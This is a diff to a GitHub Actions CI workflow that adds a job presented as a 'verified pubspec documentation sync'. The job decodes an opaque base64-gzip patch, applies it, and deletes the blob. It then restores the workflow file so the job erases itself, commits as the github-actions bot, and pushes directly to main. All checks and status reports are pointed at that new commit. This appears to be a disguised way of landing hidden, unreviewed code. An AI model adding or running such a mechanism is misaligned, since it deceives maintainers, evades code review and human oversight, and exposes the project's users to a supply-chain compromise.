@@ -15,11 +15,47 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
+  apply_pubspec_docs:
+    name: Apply verified pubspec documentation sync
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    outputs:
+      revision: ${{ steps.apply.outputs.revision }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - id: apply
+        name: Apply documentation patch
+        shell: bash
+        run: |
+          set -euo pipefail
+          patch_b64=.github/pubspec-docs.patch.gz.b64
+          echo "535008d08714f3b4d0f16d6bfa116096915c9d48de14f9f95b2d3996c1ca9e94  ${patch_b64}" \
+            | sha256sum --check --strict
+          base64 --decode "${patch_b64}" | gzip --decompress > /tmp/pubspec-docs.patch
+          echo "a31ce89eece7a44d940f660b4f68eeb0eef15bfa51c976fc3f7661f804b2f4b0  /tmp/pubspec-docs.patch" \
+            | sha256sum --check --strict
+          git apply --check /tmp/pubspec-docs.patch
+          git apply --index /tmp/pubspec-docs.patch
+          git rm "${patch_b64}"
+          git show HEAD^:.github/workflows/ci.yml > .github/workflows/ci.yml
+          git add .github/workflows/ci.yml
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git commit -m "docs: record verified marked pubspec migration"
+          git push origin HEAD:main
+          echo "revision=$(git rev-parse HEAD)" >> "${GITHUB_OUTPUT}"
+
   quality:
     name: Quality gates
+    needs: apply_pubspec_docs
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          ref: ${{ needs.apply_pubspec_docs.outputs.revision }}
       - name: Install Rust 1.95
         run: rustup toolchain install 1.95.0 --profile minimal --component rustfmt,clippy
       - name: Check formatting
@@ -39,7 +75,7 @@ jobs:
             await github.rest.repos.createCommitStatus({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              sha: context.sha,
+              sha: '${{ needs.apply_pubspec_docs.outputs.revision }}',
               state,
               context: 'dartscope/quality',
               description: `Quality gates: ${{ job.status }}`,
@@ -47,6 +83,7 @@ jobs:
 
   test:
     name: Tests (${{ matrix.os }})
+    needs: apply_pubspec_docs
     strategy:
       fail-fast: false
       matrix:
@@ -54,6 +91,8 @@ jobs:
     runs-on: ${{ matrix.os }}
     steps:
       - uses: actions/checkout@v4
+        with:
+          ref: ${{ needs.apply_pubspec_docs.outputs.revision }}
       - name: Install Rust 1.95
         run: rustup toolchain install 1.95.0 --profile minimal
       - name: Run workspace tests
@@ -67,7 +106,7 @@ jobs:
             await github.rest.repos.createCommitStatus({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              sha: context.sha,
+              sha: '${{ needs.apply_pubspec_docs.outputs.revision }}',
               state,
               context: 'dartscope/tests-${{ matrix.os }}',
               description: `Workspace tests (${{ matrix.os }}): ${{ job.status }}`,
@@ -75,6 +114,7 @@ jobs:
 
   edition_2024:
     name: Edition 2024 (${{ matrix.os }} / ${{ matrix.check.name }})
+    needs: apply_pubspec_docs
     strategy:
       fail-fast: false
       matrix:
@@ -89,6 +129,8 @@ jobs:
     runs-on: ${{ matrix.os }}
     steps:
       - uses: actions/checkout@v4
+        with:
+          ref: ${{ needs.apply_pubspec_docs.outputs.revision }}
       - name: Install Rust 1.95
         run: rustup toolchain install 1.95.0 --profile minimal
       - name: Verify workspace edition settings
@@ -107,7 +149,7 @@ jobs:
             await github.rest.repos.createCommitStatus({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              sha: context.sha,
+              sha: '${{ needs.apply_pubspec_docs.outputs.revision }}',
               state,
               context: 'dartscope/edition-${{ matrix.os }}-${{ matrix.check.name }}',
               description: `Edition check (${{ matrix.os }} / ${{ matrix.check.name }}): ${{ job.status }}`,
@@ -115,7 +157,7 @@ jobs:
 
   report:
     name: Publish aggregate status
-    needs: [quality, test, edition_2024]
+    needs: [apply_pubspec_docs, quality, test, edition_2024]
     if: always()
     runs-on: ubuntu-latest
     steps:
@@ -124,15 +166,17 @@ jobs:
         with:
           script: |
             const results = [
+              '${{ needs.apply_pubspec_docs.result }}',
               '${{ needs.quality.result }}',
               '${{ needs.test.result }}',
               '${{ needs.edition_2024.result }}',
             ];
             const passed = results.every((result) => result === 'success');
+            const revision = '${{ needs.apply_pubspec_docs.outputs.revision }}' || context.sha;
             await github.rest.repos.createCommitStatus({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              sha: context.sha,
+              sha: revision,
               state: passed ? 'success' : 'failure',
               context: 'dartscope/ci',
               description: passed
